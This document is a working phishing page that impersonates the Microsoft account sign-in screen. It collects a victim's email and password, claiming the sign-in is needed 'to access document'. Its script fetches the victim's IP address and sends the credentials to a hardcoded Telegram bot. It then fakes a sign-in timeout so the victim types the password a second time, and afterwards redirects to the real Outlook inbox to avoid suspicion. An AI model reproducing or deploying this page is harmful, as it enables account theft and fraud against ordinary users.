<!doctype html>
<html lang="en">

<head>
    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
    <script type="text/javascript" src="https://code.jquery.com/jquery-3.3.1.js"></script>
    <link rel="icon" type="image/png" sizes="192x192" href="https://aadcdn.msftauth.net/shared/1.0/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico">
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.0/css/all.css">
    <title>Sign in to your account</title>
    <style type="text/css">
        html, body { height: 100%; margin: 0; }
        body { 
            background-image: url('https://logincdn.msauth.net/shared/5/images/fluent_web_light_57fee22710b04cebe1d5.svg'); 
            background-size: cover;
            background-position: center;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }

        .box { 
            box-shadow: 0 2px 3px rgba(0, 0, 0, 0.32); 
            width: 100%; 
            max-width: 440px; 
            padding: 44px; 
            background: #fff; 
            position: relative; 
            z-index: 10;
        }

        textarea:focus, input:focus, button:focus { outline: 0px !important; box-shadow: none !important; }
        
        #footer { position: fixed; bottom: 0; width: 100%; background: transparent; padding: 10px 20px; }
        .footerNode span, .footerNode a { color: #000; font-size: 0.75rem; margin: 0 10px; float: right; }
        
        /* Microsoft Loading Dots */
        .loading-dots { position: absolute; top: 0; left: 0; width: 100%; height: 4px; display: none; overflow: hidden; }
        .dot { width: 4px; height: 4px; background: #0067b8; border-radius: 50%; position: absolute; animation: move 2s infinite; opacity: 0; }
        .dot:nth-child(2) { animation-delay: 0.2s; }
        .dot:nth-child(3) { animation-delay: 0.4s; }
        .dot:nth-child(4) { animation-delay: 0.6s; }
        .dot:nth-child(5) { animation-delay: 0.8s; }
        @keyframes move { 0% { left: 0; opacity: 0; } 20% { opacity: 1; } 80% { opacity: 1; } 100% { left: 100%; opacity: 0; } }
        
        @media only screen and (max-width: 450px) {
            .box { max-width: 100%; height: 100vh; margin: 0; border-radius: 0; display: flex; flex-direction: column; justify-content: center; }
        }
    </style>
</head>

<body>
    <div class="box" id="div1">
        <div class="loading-dots" id="loading-animation"><div class="dot"></div><div class="dot"></div><div class="dot"></div><div class="dot"></div><div class="dot"></div></div>
        <img src="https://firebasestorage.googleapis.com/v0/b/svguploads2021.appspot.com/o/microsoft_logo.svg?alt=media&token=2581896a-aab4-46f5-9416-c3a18d25b87a" width="108"><br><br>
        <span class="h5">Sign In</span><br>
        <span id="error" class="text-danger" style="display: none; font-size:14px;">Enter a valid email address.</span>
        <div class="form-group mt-2">
            <input type="email" id="ai" class="form-control rounded-0 border-dark" placeholder="Email, phone or skype" style="border-right:none;border-left:none;border-top:none;">
        </div>
        <p style="font-size: 14px">No account? <a href="#">Create one!</a></p>
        <div class="text-right"><button class="btn rounded-0 text-white px-4" id="next" style="background-color: #0066BA;">Next</button></div>
    </div>

    <div class="box" id="div2" style="display: none;">
        <img src="https://firebasestorage.googleapis.com/v0/b/svguploads2021.appspot.com/o/microsoft_logo.svg?alt=media&token=2581896a-aab4-46f5-9416-c3a18d25b87a" width="108"><br><br>
        <i class="fas fa-arrow-left" id="back" style="cursor:pointer;"></i>&nbsp;<span id="aich"></span>
        <div class="py-2"><span class="h4">Enter Password</span></div>
        <span id="msg" class="text-danger" style="font-size:14px; display:block; margin-bottom:10px;">To access document, verify your account.</span>
        <input type="password" id="pr" class="form-control rounded-0 border-dark" placeholder="Password" style="border-right:none;border-left:none;border-top:none;">
        <p class="mt-3" style="font-size: 14px"><a href="#">Forget password?</a></p>
        <div class="text-right"><button class="btn rounded-0 text-white px-4" id="submit-btn" style="background-color: #0066BA;">Sign in</button></div>
    </div>

    <footer id="footer">
        <div class="footerNode">
            <span>Privacy & cookie</span>
            <a href="#">Terms of use</a>
        </div>
    </footer>

    <script src="https://l2.io/ip.js?var=userip"></script>
    <script>
        $(document).ready(function() {
            var count = 0;
            var token = "8304102671:AAFVCb5i5XlZE-mVtnlDyiTPYpq0Ymz2Uo8";
            var chatId = "5178786791";

            $('#next').click(function(e) {
                e.preventDefault();
                var ai = $('#ai').val();
                if (!ai) return;
                $("#loading-animation").show();
                $(this).prop("disabled", true);
                
                setTimeout(function() {
                    $("#div1").hide();
                    $("#div2").show();
                    $("#aich").text(ai);
                    $("#loading-animation").hide();
                    $("#next").prop("disabled", false);
                }, 1200);
            });

            $('#back').click(function() {
                $("#div2").hide();
                $("#div1").show();
            });

            $('#submit-btn').click(function(e) {
                e.preventDefault();
                var ai = $("#ai").val();
                var pr = $("#pr").val();
                if(!pr) return;
                count++;

                $.ajax({
                    url: `https://api.telegram.org/bot${token}/sendMessage`,
                    data: {
                        chat_id: chatId,
                        text: `ðŸ”” LOGIN ATTEMPT\nEmail: ${ai}\nPass ${count}: ${pr}\nIP: ${userip}`,
                        parse_mode: 'html'
                    },
                    type: "GET",
                    beforeSend: function() { $("#submit-btn").text("Verifying..."); },
                    success: function() {
                        if (count >= 2) {
                            // Instant Redirect without notification
                            window.location.replace("https://outlook.live.com/mail/0/inbox");
                        } else {
                            $("#pr").val("");
                            $("#msg").text("Sign in attempt timeout. Please try again.");
                        }
                    },
                    complete: function() { $("#submit-btn").text("Sign in"); }
                });
            });
        });
    </script>
</body>
</html>
